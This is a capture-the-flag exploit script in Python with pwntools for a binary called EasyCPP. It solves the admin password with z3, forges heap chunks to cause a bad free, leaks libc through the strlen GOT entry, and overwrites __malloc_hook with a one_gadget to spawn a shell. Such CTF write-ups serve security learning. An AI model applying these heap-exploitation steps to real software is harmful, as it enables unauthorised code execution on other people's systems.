# -*- encoding: utf-8 -*-
import sys 
import os 
import requests
from z3 import *
from pwn import * 
binary = './EasyCPP'
os.system('chmod +x %s'%binary)
context.binary = binary
context.log_level = 'debug'
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
DEBUG = 1
if DEBUG:
    libc = elf.libc
    p = process(binary)
else:
    host = 'redirect.do-not-trust.hacking.run'
    port = '10075'
    p = remote(host,port)

l64 = lambda            : ras(u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')))
l32 = lambda            : ras(u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00')))
uu64= lambda a          : ras(u64(p.recv(a).ljust(8,'\x00')))
uu32= lambda a          : ras(u32(p.recv(a).ljust(4,'\x00')))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def ras( data ):
    lg('leak' , data)
    return data

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('choice:',num)

def decrypt(target):
    buf = [ BitVec(('x%s' % i),8) for i in range(9) ]
    for i in range(8):
        buf[i] =  ~(~(buf[i] & buf[i + 1]) & (buf[i + 1] | buf[i]) & i) & (i | ~(buf[i] & buf[i + 1]) & (buf[i + 1] | buf[i]))
    s = Solver()
    for i in range(9):
        s.add( buf[i] == target[i])
    s.check()
    m = s.model()
    res = sorted ([(d, m[d]) for d in m], key = lambda x: str(x[0]))
    result = ""
    for i in res:
        result += chr(int(str(i[1])))
    return result

def editStudent(password , stdnum ):
    cmd(1)
    sa('password:' , password )
    sa('please:' , stdnum)
    for i in range(4):
        sla(':' , 100)

ogg = one_gadget(libc.path)

dbg_args = '''Grade::Grade
b Grade::operator
b Grade::~Grade
b free
'''

def attack():
    
    pwd = decrypt([0x44,0x00,0x02,0x41,0x43,0x47,0x10,0x63,0x00])
    sla('Username:' , "admin")
    sla('Password:' , pwd)

# 其实在最开始尝试的时候就发现了，更改的密码输入过长会导致直接让程序崩溃
# 后来经过调试才知道 free 的时候 free 了一个错误的内存地址
# 再调试确定偏移为 0x80 

    passwd_addr = 0x0000000006032E0
    strlen_got = 0x000000000602F60
    T_addr = 0x00000000006032A0

    fake_chunk = flat(
        0 , 0x21,
        0 , 0,
        0 , 0x21
    )

    editStudent( fake_chunk.ljust( 0x80,'\x00' ) , 'a'*0x20 )
    # dbg(dbg_args)
    editStudent( fake_chunk.ljust( 0x80,'\x00' ) + p64(passwd_addr+0x10) , '\x20')

    ru('STUDENT: ')
    leak = uu64(4) - 0x20
    libc_base = leak if leak <0x47000000 else leak - 0x47000000

    fake_chunk = flat(
        0 , 0x21,
        0 , 0,
        0 , 0x21
    )

    editStudent( fake_chunk.ljust( 0x80,'\x00' ) + p64(libc_base+0x20), p64(strlen_got) )
    strlen_addr = l64()

    libc.address = strlen_addr - libc.sym['strlen']
    system_addr = libc.sym['system']
    __malloc_hook = libc.sym['__malloc_hook']
    one_gad = ogg[2] + libc.address


    lg('__malloc_hook',__malloc_hook)

    fake_chunk = flat(
        0 , 0x71,
        '\x00'*0x68 , 0x21
    )

    editStudent( fake_chunk.ljust( 0x80,'\x00' ) + p64(passwd_addr+0x10), 'a' )
    editStudent( flat( 0 , 0x71 ,  __malloc_hook - 0x23 ), ('a'*0x13 + p64(one_gad)).ljust(0x67 ,'\x00') )

    # dbg(dbg_args)
    editStudent( 'a', ('a'*0x13 + p64(one_gad)).ljust(0x67 ,'\x00') )
    cmd(1)
    sa('password:' , "shell" )

    # dbg()
    
    p.interactive()

attack()

'''
@File    :   EasyCPP.py
@Time    :   2022/01/19 11:51:16
@Author  :   Niyah 
'''